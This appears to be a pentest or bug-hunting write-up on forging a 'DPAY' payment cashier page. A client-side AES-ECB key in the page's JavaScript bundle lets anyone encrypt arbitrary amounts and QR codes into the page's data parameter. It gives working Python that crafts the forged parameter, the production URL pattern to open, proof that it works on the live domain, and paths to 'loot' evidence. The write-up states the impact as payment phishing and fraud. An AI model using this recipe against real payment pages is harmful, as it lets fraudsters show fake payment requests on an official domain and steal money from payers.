# DPAY cashier forgery (worked example)

## Target shape
- Sandbox and production payment pages served the same SPA bundle (`assets/home.<hash>.js`).
- Data parameter was decrypted entirely client-side:
  ```js
  AES.decrypt(Base64.decode(query.data), Utf8.parse("<KEY>"), {mode: ECB, padding: Pkcs7})
  ```
- Key was a 16-char literal in the bundle; scheme: `data = base64(base64(AES-ECB-PKCS7(json)))`.

## Payload fields
Observed in the renderer branches:
- `type`: `QRIS` | `VA`
- `payOrderId`, `amount`, `originalAmount`, `currency`, `originalCurrency`
- `qrcode` (arbitrary string rendered as QR)
- `bankCode` (`BNI`, `BRI`, ...) for the VA branch

## Craft
```python
obj = {"type":"QRIS", "originalCurrency":"CNY", "currency":"IDR",
       "amount":"150000", "originalAmount":"150000", "qrcode":"<arbitrary>"}
ct = AES.new(key, AES.MODE_ECB).encrypt(pad(json.dumps(obj, separators=(',',':')).encode(), 16))
data = base64.b64encode(base64.b64encode(ct)).decode()
```
Open `https://<prod-domain>/?data=<data>`.

## Verification
- Production domain rendered the official cashier with the attacker amount and QR; a wrong-key payload rendered blank.
- The page made no XHR calls: impact is display/QR forgery on the official domain (payment phishing/fraud), not server compromise.

## Non-issues (checked, do not re-report)
- `aliPayLinkUrl` was not data-controlled: the component built a fixed `alipays://...&qrcode=<encodeURIComponent(qrcode)>` template.
- `window.open(qrcode)` only fires for non-URL QR values; no arbitrary navigation.

## Artifacts from the original run
- Generator: `/root/cases/pay6k/scripts/dpay_redirect_craft.py`
- Evidence: `/root/cases/pay6k/loot/dpay_forged_cashier_prod.png`, `loot/dpay_forged_data_prod.txt`
